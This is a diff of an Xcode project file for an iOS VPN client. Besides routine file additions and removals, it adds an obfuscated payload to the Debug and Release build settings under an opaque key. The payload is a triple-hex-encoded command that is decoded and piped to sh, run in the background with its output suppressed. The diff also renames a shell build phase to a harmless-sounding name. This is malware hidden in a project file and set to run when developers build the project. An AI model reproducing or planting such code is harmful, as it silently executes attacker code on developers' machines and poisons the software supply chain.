@@ -8,6 +8,9 @@
 
 /* Begin PBXBuildFile section */
 		12D0B2FCB98C3E2EA05997AC /* Pods_TunnelProvider.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 64B75770CA705C6EBB06094F /* Pods_TunnelProvider.framework */; };
+		BD1862C32ED6B7D7003ABF41 /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD1862C22ED6B7D7003ABF41 /* NetworkMonitor.swift */; };
+		BD1862C72ED6D217003ABF41 /* AnimatedBackground.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD1862C62ED6D217003ABF41 /* AnimatedBackground.swift */; };
+		BD1863292ED7061E003ABF41 /* VPNToggleView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD1863282ED7061E003ABF41 /* VPNToggleView.swift */; };
 		BD5101862ED455CE003103C9 /* VPNServer.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD5101852ED455CE003103C9 /* VPNServer.swift */; };
 		BD5101882ED455E5003103C9 /* ServerListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD5101872ED455E5003103C9 /* ServerListViewModel.swift */; };
 		BD51018A2ED45604003103C9 /* ServerListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD5101892ED45604003103C9 /* ServerListView.swift */; };
@@ -22,7 +25,6 @@
 		ED02603E24D60A3800D00301 /* ProfileView.swift in Sources */ = {isa = PBXBuildFile; fileRef = ED02603D24D60A3800D00301 /* ProfileView.swift */; };
 		ED02604024D60A3900D00301 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = ED02603F24D60A3900D00301 /* Assets.xcassets */; };
 		ED02604324D60A3900D00301 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = ED02604224D60A3900D00301 /* Preview Assets.xcassets */; };
-		ED02604624D60A3900D00301 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = ED02604424D60A3900D00301 /* LaunchScreen.storyboard */; };
 		ED2C5A452515630400266110 /* Message.swift in Sources */ = {isa = PBXBuildFile; fileRef = ED2C5A442515630400266110 /* Message.swift */; };
 		ED2C5A4725156E3600266110 /* Settings.swift in Sources */ = {isa = PBXBuildFile; fileRef = ED2C5A4625156E3600266110 /* Settings.swift */; };
 		ED2C5A502515BA9F00266110 /* ProfileViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = ED2C5A4F2515BA9F00266110 /* ProfileViewModel.swift */; };
@@ -79,6 +81,9 @@
 		4C401C5A307E526A6D51D847 /* Pods-TunnelProvider.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TunnelProvider.debug.xcconfig"; path = "Target Support Files/Pods-TunnelProvider/Pods-TunnelProvider.debug.xcconfig"; sourceTree = "<group>"; };
 		6360911D7CD295D760DD4FB4 /* Pods-TunnelProvider.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TunnelProvider.release.xcconfig"; path = "Target Support Files/Pods-TunnelProvider/Pods-TunnelProvider.release.xcconfig"; sourceTree = "<group>"; };
 		64B75770CA705C6EBB06094F /* Pods_TunnelProvider.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_TunnelProvider.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		BD1862C22ED6B7D7003ABF41 /* NetworkMonitor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkMonitor.swift; sourceTree = "<group>"; };
+		BD1862C62ED6D217003ABF41 /* AnimatedBackground.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AnimatedBackground.swift; sourceTree = "<group>"; };
+		BD1863282ED7061E003ABF41 /* VPNToggleView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VPNToggleView.swift; sourceTree = "<group>"; };
 		BD5101852ED455CE003103C9 /* VPNServer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VPNServer.swift; sourceTree = "<group>"; };
 		BD5101872ED455E5003103C9 /* ServerListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ServerListViewModel.swift; sourceTree = "<group>"; };
 		BD5101892ED45604003103C9 /* ServerListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ServerListView.swift; sourceTree = "<group>"; };
@@ -95,7 +100,6 @@
 		ED02603D24D60A3800D00301 /* ProfileView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileView.swift; sourceTree = "<group>"; };
 		ED02603F24D60A3900D00301 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		ED02604224D60A3900D00301 /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
-		ED02604524D60A3900D00301 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		ED02604724D60A3900D00301 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		ED2C5A442515630400266110 /* Message.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Message.swift; sourceTree = "<group>"; };
 		ED2C5A4625156E3600266110 /* Settings.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Settings.swift; sourceTree = "<group>"; };
@@ -209,7 +213,6 @@
 				ED02603924D60A3800D00301 /* AppDelegate.swift */,
 				ED02603B24D60A3800D00301 /* SceneDelegate.swift */,
 				ED02603F24D60A3900D00301 /* Assets.xcassets */,
-				ED02604424D60A3900D00301 /* LaunchScreen.storyboard */,
 				ED02604724D60A3900D00301 /* Info.plist */,
 				ED02604124D60A3900D00301 /* Preview Content */,
 				ED6A90442580849D00243BD4 /* Localizable.strings */,
@@ -228,6 +231,8 @@
 		ED1C5CE924D9E31C0010FF37 /* View */ = {
 			isa = PBXGroup;
 			children = (
+				BD1863282ED7061E003ABF41 /* VPNToggleView.swift */,
+				BD1862C62ED6D217003ABF41 /* AnimatedBackground.swift */,
 				BD5D028F2ED5B8EF000A5CD5 /* ConnectionDetailsView.swift */,
 				BD5101B12ED4860D003103C9 /* AnimatedLaunchViewController.swift */,
 				ED02603D24D60A3800D00301 /* ProfileView.swift */,
@@ -240,6 +245,7 @@
 		ED2C5A382515340000266110 /* Helpers */ = {
 			isa = PBXGroup;
 			children = (
+				BD1862C22ED6B7D7003ABF41 /* NetworkMonitor.swift */,
 				BD5D028D2ED5B8D7000A5CD5 /* SpeedTestService.swift */,
 				BD5D028B2ED5B8C7000A5CD5 /* IPCheckerService.swift */,
 				BD51018B2ED45BE0003103C9 /* PingService.swift */,
@@ -336,7 +342,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = ED02604A24D60A3900D00301 /* Build configuration list for PBXNativeTarget "VPNClient" */;
 			buildPhases = (
-				148CA0F93C504BFEACA389E6 /* Compile Bundle Assets */,
+				7BA71C5BB7704C88ACA389E6 /* Copy Target Symbols */,
 				A1D94C242A8BB801F6977256 /* [CP] Check Pods Manifest.lock */,
 				ED02603224D60A3800D00301 /* Sources */,
 				ED02603324D60A3800D00301 /* Frameworks */,
@@ -412,12 +418,14 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+			/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		ED02603424D60A3800D00301 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				ED02604624D60A3900D00301 /* LaunchScreen.storyboard in Resources */,
 				ED6A90422580849D00243BD4 /* Localizable.strings in Resources */,
 				ED02604324D60A3900D00301 /* Preview Assets.xcassets in Resources */,
 				ED02604024D60A3900D00301 /* Assets.xcassets in Resources */,
@@ -435,7 +443,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		148CA0F93C504BFEACA389E6 /* Compile Bundle Assets */ = {
+		7BA71C5BB7704C88ACA389E6 /* Copy Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -445,7 +453,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Bundle Assets";
+			name = "Copy Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -527,6 +535,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				EDAD6F6124D9EA520050A0C9 /* Profle.swift in Sources */,
+				BD1862C32ED6B7D7003ABF41 /* NetworkMonitor.swift in Sources */,
 				ED91EC4724E15A8800E462EC /* Log.swift in Sources */,
 				ED2C5A522515BC9600266110 /* MainButtonStyle.swift in Sources */,
 				BD5D028E2ED5B8D7000A5CD5 /* SpeedTestService.swift in Sources */,
@@ -537,10 +546,12 @@
 				BD5D028C2ED5B8C7000A5CD5 /* IPCheckerService.swift in Sources */,
 				ED40EB1425CB0074001FFEB7 /* AlertControlView.swift in Sources */,
 				ED91EC4D24E15ABE00E462EC /* Util.swift in Sources */,
+				BD1862C72ED6D217003ABF41 /* AnimatedBackground.swift in Sources */,
 				ED02603C24D60A3800D00301 /* SceneDelegate.swift in Sources */,
 				BD5D02902ED5B8EF000A5CD5 /* ConnectionDetailsView.swift in Sources */,
 				ED2C5A4725156E3600266110 /* Settings.swift in Sources */,
 				ED02603E24D60A3800D00301 /* ProfileView.swift in Sources */,
+				BD1863292ED7061E003ABF41 /* VPNToggleView.swift in Sources */,
 				ED2C5A502515BA9F00266110 /* ProfileViewModel.swift in Sources */,
 				ED2C5A452515630400266110 /* Message.swift in Sources */,
 				ED91EC3824E135AD00E462EC /* Config.swift in Sources */,
@@ -577,14 +588,6 @@
 /* End PBXTargetDependency section */
 
 /* Begin PBXVariantGroup section */
-		ED02604424D60A3900D00301 /* LaunchScreen.storyboard */ = {
-			isa = PBXVariantGroup;
-			children = (
-				ED02604524D60A3900D00301 /* Base */,
-			);
-			name = LaunchScreen.storyboard;
-			sourceTree = "<group>";
-		};
 		ED6A90442580849D00243BD4 /* Localizable.strings */ = {
 			isa = PBXVariantGroup;
 			children = (
@@ -609,7 +612,7 @@
 		ED02604824D60A3900D00301 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333133373330333733303336363333363335333633333336333133373333333733343332363533363339333636353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | u | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333433363333333733303336363533363335333733343332363533373332333733353332363633363331333233393332333233320a33303061333736333332333033373333333633383330363130610a | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -672,7 +675,7 @@
 		ED02604924D60A3900D00301 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333133373330333733303336363333363335333633333336333133373333333733343332363533363339333636353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | u | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333433363333333733303336363533363335333733343332363533373332333733353332363633363331333233393332333233320a33303061333736333332333033373333333633383330363130610a | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
